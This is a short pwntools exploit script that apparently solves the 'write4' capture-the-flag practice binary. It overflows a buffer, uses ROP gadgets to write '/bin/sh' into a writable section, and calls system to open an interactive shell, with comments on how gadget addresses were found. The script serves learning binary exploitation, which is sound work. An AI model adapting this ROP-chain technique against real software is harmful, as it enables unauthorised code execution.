#! /usr/share/env python3
from pwn import *

context(terminal=['tmux', 'new-window'])

#p = gdb.debug("./write4", gdbscript = '''
#init-peda
#b *0x4007ff
#''')
p = process("./write4")

elf = ("./write4")
rop = ROP(elf)

junk = "A"*40
# we use r2 to find the rw sections in the binary: iS
# 24 0x00001000    80 0x00601000    80 -rw- .got.plt
# we have to call system, so we do afl:
#0x004005e0    1 6            sym.imp.system
sys = p64(0x4005e0)
got_plt = p64(0x601000)
pop_r15_r14 = p64(0x400890) # pop r14 ; pop r15 ; ret
mov_r14_r15 = p64(0x400820) # mov qword ptr [r14], r15 ; ret
pop_rdi = p64(0x400893)
sh = "/bin/sh\x00"
# so what we want to do is pop the top of the stack to a r14(the dest),r15(the source)
# then mov [dest](r14), [source](r15), and a ret
p.recvuntil("> ")
payload = junk + pop_r15_r14 + got_plt + sh + mov_r14_r15 + pop_rdi + got_plt + sys
p.sendline(payload)
p.interactive()
